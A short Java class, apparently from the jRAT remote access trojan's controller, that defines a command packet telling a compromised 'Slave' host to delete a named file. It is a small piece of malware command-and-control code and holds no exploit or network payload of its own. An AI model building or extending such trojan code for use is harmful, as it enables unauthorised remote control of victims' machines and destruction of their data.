package io.jrat.controller.packets.outgoing;

import io.jrat.controller.Slave;
import java.io.DataOutputStream;


public class Packet16DeleteFile extends AbstractOutgoingPacket {

	private String file;

	public Packet16DeleteFile(String file) {
		this.file = file;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(file);
	}

	@Override
	public short getPacketId() {
		return 16;
	}

}
